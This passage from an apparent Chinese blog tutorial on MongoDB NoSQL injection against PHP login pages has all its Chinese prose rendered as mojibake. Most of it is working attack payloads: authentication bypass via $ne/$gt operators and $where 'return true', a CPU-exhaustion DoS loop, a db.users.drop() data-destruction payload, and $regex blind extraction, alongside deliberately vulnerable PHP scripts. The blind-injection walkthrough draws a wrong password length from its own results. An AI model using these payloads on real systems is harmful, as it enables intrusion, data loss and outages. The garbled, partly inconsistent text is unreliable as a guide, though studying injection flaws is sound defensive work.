&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c7b257f18542b68c4b8&quot;), &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : &quot;123456&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c80257f18542b68c4b9&quot;), &quot;username&quot; : &quot;whoami&quot;, &quot;password&quot; : &quot;657260&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c85257f18542b68c4ba&quot;), &quot;username&quot; : &quot;bunny&quot;, &quot;password&quot; : &quot;964795&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c88257f18542b68c4bb&quot;), &quot;username&quot; : &quot;bob&quot;, &quot;password&quot; : &quot;965379&quot; &#125;</code></pre>

<p>ç”±äº users é›†åˆä¸­ username å’Œ password éƒ½ä¸ç­‰äº 1ï¼Œæ‰€ä»¥å°†æ‰€æœ‰çš„æ–‡æ¡£æ•°æ®æŸ¥å‡ºï¼Œè¿™å¾ˆå¯èƒ½æ˜¯çœŸå®çš„ï¼Œå¹¶ä¸”å¯èƒ½å…è®¸æ”»å‡»è€…ç»•è¿‡èº«ä»½éªŒè¯ã€‚</p>
<p>å¯¹äº PHP æœ¬èº«çš„ç‰¹æ€§è€Œè¨€ï¼Œç”±äºå…¶æ¾æ•£çš„æ•°ç»„ç‰¹æ€§ï¼Œå¯¼è‡´å¦‚æœæˆ‘ä»¬å‘é€ <code>value=1</code> é‚£ä¹ˆï¼Œä¹Ÿå°±æ˜¯å‘é€äº†ä¸€ä¸ª <code>value</code> çš„å€¼ä¸º 1 çš„æ•°æ®ã€‚å¦‚æœå‘é€ <code>value[$ne]=1</code> åˆ™ PHP ä¼šå°†å…¶è½¬æ¢ä¸ºæ•°ç»„ <code>value=array($ne=&gt;1)</code>ï¼Œå½“æ•°æ®åˆ°äº†è¿›å…¥ MongoDB åï¼ŒåŸæ¥ä¸€ä¸ªå•ä¸€çš„ <code>&#123;&quot;value&quot;:1&#125;</code> æŸ¥è¯¢å°±å˜æˆäº†ä¸€ä¸ª <code>&#123;&quot;value&quot;:&#123;$ne:1&#125;</code> æ¡ä»¶æŸ¥è¯¢ã€‚åŒæ ·çš„ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸‹é¢è¿™äº›ä½œä¸º payload è¿›è¡Œæ”»å‡»ï¼š</p>
<pre><code class="highlight plaintext">username[$ne]=&amp;password[$ne]=
username[$gt]=&amp;password[$gt]=
username[$gte]=&amp;password[$gte]=</code></pre>

<p>è¿™ç§é‡è¨€å¼æ³¨å…¥çš„æ–¹å¼ä¹Ÿæ˜¯æˆ‘ä»¬é€šå¸¸ç”¨æ¥éªŒè¯ç½‘ç«™æ˜¯å¦å­˜åœ¨ NoSQL æ³¨å…¥çš„ç¬¬ä¸€æ­¥ã€‚</p>
<h4 id="è”åˆæŸ¥è¯¢æ³¨å…¥"><a href="#è”åˆæŸ¥è¯¢æ³¨å…¥" class="headerlink" title="è”åˆæŸ¥è¯¢æ³¨å…¥"></a>è”åˆæŸ¥è¯¢æ³¨å…¥</h4><p>åœ¨ MongoDB ä¹‹ç±»çš„æµè¡Œæ•°æ®å­˜å‚¨ä¸­ï¼ŒJSON æŸ¥è¯¢ç»“æ„ä½¿å¾—è”åˆæŸ¥è¯¢æ³¨å…¥æ”»å‡»å˜å¾—æ¯”è¾ƒå¤æ‚äº†ï¼Œä½†ä¹Ÿæ˜¯å¯ä»¥å®ç°çš„ã€‚</p>
<p>æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œç›´æ¥å¯¹ SQL æŸ¥è¯¢è¯­å¥è¿›è¡Œå­—ç¬¦æ‹¼æ¥ä¸²å®¹æ˜“é€ æˆ SQL æ³¨å…¥ï¼ŒNoSQL ä¹Ÿæœ‰ç±»ä¼¼é—®é¢˜ã€‚å¦‚ä¸‹å®ä¾‹ï¼Œå‡è®¾åç«¯çš„ MongoDB æŸ¥è¯¢è¯­å¥ä½¿ç”¨äº†å­—ç¬¦ä¸²æ‹¼æ¥ï¼š</p>
<pre><code class="highlight plaintext">string query =&quot;&#123; username: &#x27;&quot; + $username + &quot;&#x27;, password: &#x27;&quot; + $password + &quot;&#x27; &#125;&quot;</code></pre>

<p>å½“ç”¨æˆ·æ­£ç¡®çš„ç”¨æˆ·åå¯†ç è¿›è¡Œç™»å½•æ—¶ï¼Œå¾—åˆ°çš„æŸ¥è¯¢è¯­å¥æ˜¯åº”è¯¥è¿™æ ·çš„ï¼š</p>
<pre><code class="highlight plaintext">&#123;&#x27;username&#x27;:&#x27;admin&#x27;, &#x27;password&#x27;:&#x27;123456&#x27;&#125;</code></pre>

<p>å¦‚æœæ­¤æ—¶æ²¡æœ‰å¾ˆå¥½åœ°å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œè¿‡æ»¤æˆ–è€…æ•ˆéªŒï¼Œé‚£æ”»å‡»è€…ä¾¿å¯ä»¥æ„é€ å¦‚ä¸‹ payloadï¼š</p>
<pre><code class="highlight plaintext">username=admin&#x27;, $or: [ &#123;&#125;, &#123;&#x27;a&#x27;: &#x27;a&amp;password=&#x27; &#125;], $comment: &#x27;123456</code></pre>

<p>æ‹¼æ¥å…¥æŸ¥è¯¢è¯­å¥åç›¸å½“äºæ‰§è¡Œäº†ï¼š</p>
<pre><code class="highlight plaintext">&#123; username: &#x27;admin&#x27;, $or: [ &#123;&#125;, &#123;&#x27;a&#x27;:&#x27;a&#x27;, password: &#x27;&#x27; &#125;], $comment: &#x27;123456&#x27;&#125;</code></pre>

<p>æ­¤æ—¶ï¼Œåªè¦ç”¨æˆ·åæ˜¯æ­£ç¡®çš„ï¼Œè¿™ä¸ªæŸ¥è¯¢å°±å¯ä»¥æˆåŠŸã€‚è¿™ç§æ‰‹æ³•å’Œ SQL æ³¨å…¥æ¯”è¾ƒç›¸ä¼¼ï¼š</p>
<pre><code class="highlight plaintext">select * from logins where username = &#x27;admin&#x27; and (password true&lt;&gt; or (&#x27;a&#x27;=&#x27;a&#x27; and password = &#x27;&#x27;))</code></pre>

<p>è¿™æ ·ï¼ŒåŸæœ¬æ­£å¸¸çš„æŸ¥è¯¢è¯­å¥ä¼šè¢«è½¬æ¢ä¸ºå¿½ç•¥å¯†ç çš„ï¼Œåœ¨æ— éœ€å¯†ç çš„æƒ…å†µä¸‹ç›´æ¥ç™»å½•ç”¨æˆ·è´¦å·ï¼Œå› ä¸º <code>()</code> å†…çš„æ¡ä»¶æ€»æ˜¯æ°¸çœŸçš„ã€‚</p>
<p>ä½†æ˜¯ç°åœ¨æ— è®ºæ˜¯ PHP çš„ MongoDB Driver è¿˜æ˜¯ Nodejs çš„ Mongoose éƒ½å¿…é¡»è¦æ±‚æŸ¥è¯¢æ¡ä»¶å¿…é¡»æ˜¯ä¸€ä¸ªæ•°ç»„æˆ–è€… Query å¯¹è±¡äº†ï¼Œå› æ­¤è¿™ç§æ³¨å…¥æ–¹æ³•ç®€å•äº†è§£ä¸€ä¸‹å°±å¥½äº†ã€‚</p>
<h4 id="jsæ³¨å…¥"><a href="#jsæ³¨å…¥" class="headerlink" title="jsæ³¨å…¥"></a>jsæ³¨å…¥</h4><h5 id="where-æ“ä½œç¬¦"><a href="#where-æ“ä½œç¬¦" class="headerlink" title="$where æ“ä½œç¬¦"></a>$where æ“ä½œç¬¦</h5><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦äº†è§£ä¸€ä¸‹ <code>$where</code> æ“ä½œç¬¦ã€‚åœ¨ MongoDB ä¸­ï¼Œ<code>$where</code> æ“ä½œç¬¦å¯ä»¥ç”¨æ¥æ‰§è¡Œ JavaScript ä»£ç ï¼Œå°† JavaScript è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²æˆ– JavaScript å‡½æ•°ä½œä¸ºæŸ¥è¯¢è¯­å¥çš„ä¸€éƒ¨åˆ†ã€‚åœ¨ MongoDB 2.4 ä¹‹å‰ï¼Œé€šè¿‡ <code>$where</code> æ“ä½œç¬¦ä½¿ç”¨ <code>map-reduce</code>ã€<code>group</code> å‘½ä»¤ç”šè‡³å¯ä»¥è®¿é—®åˆ° Mongo Shell ä¸­çš„å…¨å±€å‡½æ•°å’Œå±æ€§ï¼Œå¦‚ <code>db</code>ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥åœ¨è‡ªå®šä¹‰çš„å‡½æ•°é‡Œè·å–æ•°æ®åº“çš„æ‰€æœ‰ä¿¡æ¯ã€‚</p>
<p>å¦‚ä¸‹å®ä¾‹ï¼š</p>
<pre><code class="highlight plaintext">&gt; db.users.find(&#123; $where: &quot;function()&#123;return(this.username == &#x27;whoami&#x27;)&#125;&quot; &#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c80257f18542b68c4b9&quot;), &quot;username&quot; : &quot;whoami&quot;, &quot;password&quot; : &quot;657260&quot; &#125;
&gt;</code></pre>

<p>ç”±äºä½¿ç”¨äº† <code>$where</code> å…³é”®å­—ï¼Œå…¶åé¢çš„ JavaScript å°†ä¼šè¢«æ‰§è¡Œå¹¶è¿”å› â€œwhoamiâ€ï¼Œç„¶åå°†æŸ¥è¯¢å‡º username ä¸º whoami çš„æ•°æ®ã€‚</p>
<p>æŸäº›æ˜“å—æ”»å‡»çš„ PHP åº”ç”¨ç¨‹åºåœ¨æ„å»º MongoDB æŸ¥è¯¢æ—¶å¯èƒ½ä¼šç›´æ¥æ’å…¥æœªç»è¿‡å¤„ç†çš„ç”¨æˆ·è¾“å…¥ï¼Œä¾‹å¦‚ä»å˜é‡ä¸­ <code>$userData</code> è·å–æŸ¥è¯¢æ¡ä»¶ï¼š</p>
<pre><code class="highlight plaintext">db.users.find(&#123; $where: &quot;function()&#123;return(this.username == $userData)&#125;&quot; &#125;)</code></pre>

<p>ç„¶åï¼Œæ”»å‡»è€…å¯èƒ½ä¼šæ³¨å…¥ä¸€ç§æ¶æ„çš„å­—ç¬¦ä¸²å¦‚ <code>&#39;a&#39;; sleep(5000)</code> ï¼Œæ­¤æ—¶ MongoDB æ‰§è¡Œçš„æŸ¥è¯¢è¯­å¥ä¸ºï¼š</p>
<pre><code class="highlight plaintext">db.users.find(&#123; $where: &quot;function()&#123;return(this.username == &#x27;a&#x27;; sleep(5000))&#125;&quot; &#125;)</code></pre>

<p>å¦‚æœæ­¤æ—¶æœåŠ¡å™¨æœ‰ 5 ç§’é’Ÿçš„å»¶è¿Ÿåˆ™è¯´æ˜æ³¨å…¥æˆåŠŸã€‚</p>
<p>ä¸‹é¢æˆ‘ä»¬ç¼–å†™ index.php è¿›è¡Œæµ‹è¯•ï¼š</p>
<pre><code class="highlight plaintext">&lt;?php
$manager = new MongoDB\Driver\Manager(&quot;mongodb://127.0.0.1:27017&quot;);
$username = $_POST[&#x27;username&#x27;];
$password = $_POST[&#x27;password&#x27;];
$function = &quot;
function() &#123; 
    var username = &#x27;&quot;.$username.&quot;&#x27;;
    var password = &#x27;&quot;.$password.&quot;&#x27;;
    if(username == &#x27;admin&#x27; &amp;&amp; password == &#x27;123456&#x27;)&#123;
        return true;
    &#125;else&#123;
        return false;
    &#125;
&#125;&quot;;
$query = new MongoDB\Driver\Query(array(
    &#x27;$where&#x27; =&gt; $function
));
$result = $manager-&gt;executeQuery(&#x27;test.users&#x27;, $query)-&gt;toArray();
$count = count($result);
if ($count&gt;0) &#123;
    foreach ($result as $user) &#123;
        $user=(array)$user;
        echo &#x27;====Login Success====&lt;br&gt;&#x27;;
        echo &#x27;username: &#x27;.$user[&#x27;username&#x27;].&quot;&lt;br&gt;&quot;;
        echo &#x27;password: &#x27;.$user[&#x27;password&#x27;].&quot;&lt;br&gt;&quot;;
    &#125;
&#125;
else&#123;
    echo &#x27;Login Failed&#x27;;
&#125;
?&gt;</code></pre>

<ul>
<li><strong>MongoDB 2.4 ä¹‹å‰</strong></li>
</ul>
<p>åœ¨ MongoDB 2.4 ä¹‹å‰ï¼Œé€šè¿‡ <code>$where</code> æ“ä½œç¬¦ä½¿ç”¨ <code>map-reduce</code>ã€<code>group</code> å‘½ä»¤å¯ä»¥è®¿é—®åˆ° Mongo Shell ä¸­çš„å…¨å±€å‡½æ•°å’Œå±æ€§ï¼Œå¦‚ <code>db</code>ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥é€šè¿‡è‡ªå®šä¹‰ JavaScript å‡½æ•°æ¥è·å–æ•°æ®åº“çš„æ‰€æœ‰ä¿¡æ¯ã€‚</p>
<p>å¦‚ä¸‹æ‰€ç¤ºï¼Œå‘é€ä»¥ä¸‹æ•°æ®åï¼Œå¦‚æœæœ‰å›æ˜¾çš„è¯å°†è·å–å½“å‰æ•°æ®åº“ä¸‹æ‰€æœ‰çš„é›†åˆåï¼š</p>
<pre><code class="highlight plaintext">username=1&amp;password=1&#x27;;(function()&#123;return(tojson(db.getCollectionNames()))&#125;)();var a=&#x27;1</code></pre>

<ul>
<li><strong>MongoDB 2.4 ä¹‹å</strong></li>
</ul>
<p>MongoDB 2.4 ä¹‹å <code>db</code> å±æ€§è®¿é—®ä¸åˆ°äº†ï¼Œä½†æˆ‘ä»¬åº”ç„¶å¯ä»¥æ„é€ ä¸‡èƒ½å¯†ç ã€‚å¦‚æœæ­¤æ—¶æˆ‘ä»¬å‘é€ä»¥ä¸‹è¿™å‡ ç§æ•°æ®ï¼š</p>
<pre><code class="highlight plaintext">username=1&amp;password=1&#x27;;return true//
æˆ–
username=1&amp;password=1&#x27;;return true;var a=&#x27;1</code></pre>

<p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒæˆåŠŸæŸ¥å‡ºæ‰€æœ‰çš„ç”¨æˆ·ä¿¡æ¯ï¼š</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20210724161640-790ad458-ec57-1.png" alt="20210724161640-790ad458-ec57-1"></p>
<p>è¿™æ˜¯å› ä¸ºå‘é€ payload è¿›å…¥ PHP åçš„æ•°æ®å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight plaintext">array(
    &#x27;$where&#x27; =&gt; &quot;
    function() &#123; 
        var username = &#x27;1&#x27;;
        var password = &#x27;1&#x27;;return true;var a=&#x27;1&#x27;;
        if(username == &#x27;admin&#x27; &amp;&amp; password == &#x27;123456&#x27;)&#123;
            return true;
        &#125;else&#123;
            return false;
        &#125;
    &#125;
&quot;)</code></pre>

<p>è¿›å…¥ MongoDB åæ‰§è¡Œçš„æŸ¥è¯¢å‘½ä»¤ä¸ºï¼š</p>
<pre><code class="highlight plaintext">&gt; db.users.find(&#123;$where: &quot;function() &#123; var username = &#x27;1&#x27;;var password = &#x27;1&#x27;;return true;var a=&#x27;1&#x27;;if(username == &#x27;admin&#x27; &amp;&amp; password == &#x27;123456&#x27;)&#123; return true; &#125;else&#123; return false; &#125;&#125;&quot;&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c7b257f18542b68c4b8&quot;), &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : &quot;123456&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c80257f18542b68c4b9&quot;), &quot;username&quot; : &quot;whoami&quot;, &quot;password&quot; : &quot;657260&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c85257f18542b68c4ba&quot;), &quot;username&quot; : &quot;bunny&quot;, &quot;password&quot; : &quot;964795&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c88257f18542b68c4bb&quot;), &quot;username&quot; : &quot;bob&quot;, &quot;password&quot; : &quot;965379&quot; &#125;
&gt;</code></pre>

<p>æˆ‘ä»¬ä»ä»£ç ä¸­å¯ä»¥çœ‹å‡ºï¼Œpassword ä¸­çš„ <code>return true</code> ä½¿å¾—æ•´ä¸ª JavaScript ä»£ç æå‰ç»“æŸå¹¶è¿”å›äº† <code>true</code>ï¼Œè¿™æ ·å°±æ„é€ å‡ºäº†ä¸€ä¸ªæ°¸çœŸçš„æ¡ä»¶å¹¶å®Œæˆäº† NoSQL æ³¨å…¥ã€‚</p>
<p>æ­¤å¤–è¿˜æœ‰ä¸€ä¸ªç±»ä¼¼äº DOS æ”»å‡»çš„ payloadï¼Œå¯ä»¥è®©æœåŠ¡å™¨ CPU é£™å‡åˆ° 100% æŒç»­ 5 ç§’ï¼š</p>
<pre><code class="highlight plaintext">username=1&amp;password=1&#x27;;(function()&#123;var date = new Date(); do&#123;curDate = new Date();&#125;while(curDate-date&lt;5000); return Math.max();&#125;)();var a=&#x27;1</code></pre>

<h5 id="commmandæ–¹æ³•æ³¨å…¥"><a href="#commmandæ–¹æ³•æ³¨å…¥" class="headerlink" title="commmandæ–¹æ³•æ³¨å…¥"></a>commmandæ–¹æ³•æ³¨å…¥</h5><p>MongoDB driverä¸€èˆ¬éƒ½æä¾›ç›´æ¥æ‰§è¡Œshellå‘½ä»¤çš„æ–¹æ³•ï¼Œè¿™äº›æ–¹å¼ä¸€èˆ¬æ˜¯ä¸æ¨èä½¿ç”¨çš„ï¼Œä½†éš¾å…æœ‰äººä¸ºäº†å®ç°ä¸€äº›å¤æ‚çš„æŸ¥è¯¢å»ä½¿ç”¨ï¼Œåœ¨phpå®˜ç½‘ä¸­å°±å·²ç»å‹æƒ…æé†’äº†ä¸è¦è¿™æ ·ä½¿ç”¨:</p>
<pre><code class="highlight plaintext">&lt;?php
$m = new MongoDB\Driver\Manager;
// Don&#x27;t do this!!!
$username = $_GET[&#x27;field&#x27;];
// $username is set to &quot;&#x27;); db.users.drop(); print(&#x27;&quot;$cmd = new \MongoDB\Driver\Command( [
&#x27;eval&#x27; =&gt; &quot;print(&#x27;Hello, $username!&#x27;);&quot;
] );

$r = $m-&gt;executeCommand( &#x27;dramio&#x27;, $cmd );?&gt;</code></pre>

<p>ä¹Ÿå¯ä»¥ç”¨Commandå»å®ç°Mongoçš„<code>distinct</code>æ–¹æ³•</p>
<pre><code class="highlight plaintext">&lt;?php
$manager = new MongoDB\Driver\Manager();

$uname = $_GET[&#x27;username&#x27;];
$pwd = $_GET[&#x27;password&#x27;];

$cmd = new MongoDB\Driver\Command([
&#x27;eval&#x27;=&gt; &quot;db.users.distinct(&#x27;uname&#x27;, &#123;uname: &#x27;&quot;.$uname.&quot;&#x27;, pwd: &#x27;&quot;.$pwd.&quot;&#x27;&#125;)&quot;
]);
echo &quot;db.users.distinct(&#x27;uname&#x27;, &#123;uname: &#x27;&quot;.$uname.&quot;&#x27;, pwd: &#x27;&quot;.$pwd.&quot;&#x27;&#125;)&quot;;
$result = $manager-&gt;executeCommand(&#x27;sec_test&#x27;, $cmd)-&gt;toArray();
$result =((array)$result[0])[&#x27;retval&#x27;];
$count = count($result);
if ($count&gt;0) &#123;
    foreach ($result as $user) &#123;
        $user=(array)$user;
        echo &#x27;username: &#x27;.$user[&#x27;uname&#x27;].&quot;\n&quot;;
        echo &#x27;password: &#x27;.$user[&#x27;pwd&#x27;].&quot;\n&quot;;
    &#125;
&#125;
else&#123;
    echo &#x27;ç”¨æˆ·ä¸å­˜åœ¨&#x27;;
&#125;
?&gt;</code></pre>

<p>è¿™ä¸ªå°±å±é™©å¤ªå¤šäº†ï¼Œå°±ç›¸å½“äºæŠŠmongo shellå¼€æ”¾ç»™ç”¨æˆ·äº†ï¼Œä½ åŸºæœ¬å¯ä»¥æ„å»ºä»»ä½•mongo shellå¯ä»¥æ‰§è¡Œçš„payloadäº†ï¼Œå¦‚æœå½“å‰åº”ç”¨è¿æ¥æ•°æ®åº“çš„æƒé™æ°å¥½å¾ˆé«˜ï¼Œæˆ‘ä»¬èƒ½å¹²çš„äº‹æƒ…æ›´å¤šã€‚å¦‚æ„å»º</p>
<pre><code class="highlight plaintext">payload:username=2&#x27;&#125;);db.users.drop();db.user.find(&#123;&#x27;username&#x27;:&#x27;2</code></pre>



<h5 id="executeæ–¹æ³•æ³¨å…¥"><a href="#executeæ–¹æ³•æ³¨å…¥" class="headerlink" title="executeæ–¹æ³•æ³¨å…¥"></a>executeæ–¹æ³•æ³¨å…¥</h5><p>åœ¨æ—§ç‰ˆæœ¬ä¸­ï¼Œå¯ä»¥ç”¨executeæ¥æ‰§è¡Œä¸€æ®µå­—ç¬¦ä¸²</p>
<pre><code class="highlight plaintext">&lt;?php

$mongo = new mongoclient();
$uname = $_GET[&#x27;username&#x27;];
$pwd = $_GET[&#x27;password&#x27;];

$db = $mongo-&gt;sec_test; // é€‰æ‹©æ•°æ®åº“
$query = &quot;db.users.find(&#123;&#x27;uname&#x27;: &quot;.$uname.&quot;&#125;,&#123;&#x27;pwd&#x27;, &quot;.$pwd.&quot;&#125;)&quot;;
$result = $db-&gt;execute($query);

if ($result-&gt;count() &gt; 0) &#123;
    foreach ($result as $user) &#123;
        echo &#x27;username: &#x27;.$user[&#x27;uname&#x27;].&quot;\n&quot;;
        echo &#x27;password: &#x27;.$user[&#x27;pwd&#x27;].&quot;\n&quot;;
    &#125;
&#125;
else&#123;
    echo &#x27;è¯¥ç”¨æˆ·ä¸å­˜åœ¨&#x27;;
&#125;
?&gt;</code></pre>

<p>è€Œåœ¨æ–°ç‰ˆæœ¬ä¸­ï¼Œå¤šç”¨executeQueryæ¥è¿›è¡ŒæŸ¥è¯¢</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Manager</span>();

<span class="variable">$uname</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$pwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];

<span class="variable">$function</span> = <span class="string">&quot;function() &#123;if(this.uname == &#x27;<span class="subst">$uname</span>&#x27; &amp;&amp; this.pwd == &#x27;<span class="subst">$pwd</span>&#x27;) return &#123;&#x27;username&#x27;: this.uname, &#x27;password&#x27;: this.pwd&#125;&#125;&quot;</span>;

<span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Query</span>(<span class="keyword">array</span>(
<span class="string">&#x27;$where&#x27;</span> =&gt; <span class="variable">$function</span>
));

<span class="variable">$result</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="string">&#x27;sec_test.users&#x27;</span>, <span class="variable">$query</span>)-&gt;<span class="title function_ invoke__">toArray</span>();

<span class="variable">$count</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$result</span>);
<span class="keyword">if</span> (<span class="variable">$count</span>&gt;<span class="number">0</span>) &#123;
    <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$user</span>) &#123;
        <span class="variable">$user</span>=(<span class="keyword">array</span>)<span class="variable">$user</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;username: &#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;uname&#x27;</span>].<span class="string">&quot;\n&quot;</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;password: &#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;pwd&#x27;</span>].<span class="string">&quot;\n&quot;</span>;
    &#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">echo</span> <span class="string">&#x27;ç”¨æˆ·ä¸å­˜åœ¨&#x27;</span>;
&#125;
<span class="meta">?&gt;</span></code></pre>

<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Manager</span>();

<span class="variable">$uname</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$pwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];

<span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Query</span>(<span class="keyword">array</span>(
    <span class="string">&#x27;uname&#x27;</span>=&gt;<span class="variable">$uname</span>,
    <span class="string">&#x27;pwd&#x27;</span>=&gt;<span class="variable">$pwd</span>
));

<span class="variable">$result</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="string">&#x27;sec_test.users&#x27;</span>, <span class="variable">$query</span>)-&gt;<span class="title function_ invoke__">toArray</span>();

<span class="variable">$count</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$result</span>);
<span class="keyword">if</span> (<span class="variable">$count</span>&gt;<span class="number">0</span>) &#123;
    <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$user</span>) &#123;
        <span class="variable">$user</span>=(<span class="keyword">array</span>)<span class="variable">$user</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;username: &#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;uname&#x27;</span>].<span class="string">&quot;\n&quot;</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;password: &#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;pwd&#x27;</span>].<span class="string">&quot;\n&quot;</span>;
    &#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">echo</span> <span class="string">&#x27;æœªæ‰¾åˆ°&#x27;</span>;
&#125;
<span class="meta">?&gt;</span></code></pre>



<h4 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h4><p>å½“é¡µé¢æ²¡æœ‰å›æ˜¾æ—¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>$regex</code> æ­£åˆ™è¡¨è¾¾å¼æ¥è¿›è¡Œç›²æ³¨ï¼Œ <code>$regex</code> å¯ä»¥è¾¾åˆ°å’Œä¼ ç»Ÿ SQL æ³¨å…¥ä¸­ <code>substr()</code> å‡½æ•°ç›¸åŒçš„åŠŸèƒ½ã€‚</p>
<p>æˆ‘ä»¬è¿˜æ˜¯åˆ©ç”¨ç¬¬ä¸€ä¸ª index.php è¿›è¡Œæ¼”ç¤ºï¼š</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Manager</span>(<span class="string">&quot;mongodb://127.0.0.1:27017&quot;</span>);
<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];

<span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Query</span>(<span class="keyword">array</span>(
    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>,
    <span class="string">&#x27;password&#x27;</span> =&gt; <span class="variable">$password</span>
));

<span class="variable">$result</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="string">&#x27;test.users&#x27;</span>, <span class="variable">$query</span>)-&gt;<span class="title function_ invoke__">toArray</span>();
<span class="variable">$count</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$result</span>);
<span class="keyword">if</span> (<span class="variable">$count</span> &gt; <span class="number">0</span>) &#123;
    <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$user</span>) &#123;
        <span class="variable">$user</span> = ((<span class="keyword">array</span>)<span class="variable">$user</span>);
        <span class="keyword">echo</span> <span class="string">&#x27;====Login Success====&lt;br&gt;&#x27;</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;username:&#x27;</span> . <span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;password:&#x27;</span> . <span class="variable">$user</span>[<span class="string">&#x27;password&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;
    &#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">echo</span> <span class="string">&#x27;Login Failed&#x27;</span>;
&#125;
<span class="meta">?&gt;</span></code></pre>

<p>å¸ƒå°”ç›²æ³¨é‡ç‚¹åœ¨äºæ€ä¹ˆé€ä¸ªæå–å­—ç¬¦ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œåœ¨å·²çŸ¥ä¸€ä¸ªç”¨æˆ·åçš„æƒ…å†µä¸‹åˆ¤æ–­å¯†ç çš„é•¿åº¦ï¼š</p>
<pre><code class="highlight plaintext">username=admin&amp;password[$regex]=.&#123;4&#125;    // ç™»å½•æˆåŠŸ
username=admin&amp;password[$regex]=.&#123;5&#125;    // ç™»å½•æˆåŠŸ
username=admin&amp;password[$regex]=.&#123;6&#125;    // ç™»å½•æˆåŠŸ
username=admin&amp;password[$regex]=.&#123;7&#125;    // ç™»å½•å¤±è´¥
......</code></pre>

<p>åœ¨ <code>password[$regex]=.&#123;6&#125;</code> æ—¶å¯ä»¥æˆåŠŸç™»å½•ï¼Œä½†åœ¨ <code>password[$regex]=.&#123;7&#125;</code> æ—¶ç™»å½•å¤±è´¥ï¼Œè¯´æ˜è¯¥ whoami ç”¨æˆ·çš„å¯†ç é•¿åº¦ä¸º 7ã€‚</p>
<p>æäº¤çš„æ•°æ®è¿›å…¥ PHP åçš„æ•°æ®å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight plaintext">array(
    &#x27;username&#x27; =&gt; &#x27;admin&#x27;,
    &#x27;password&#x27; =&gt; array(&#x27;$regex&#x27; =&gt; &#x27;.&#123;6&#125;&#x27;)
)</code></pre>

<p>è¿›å…¥ MongoDB åæ‰§è¡Œçš„æŸ¥è¯¢å‘½ä»¤ä¸ºï¼š</p>
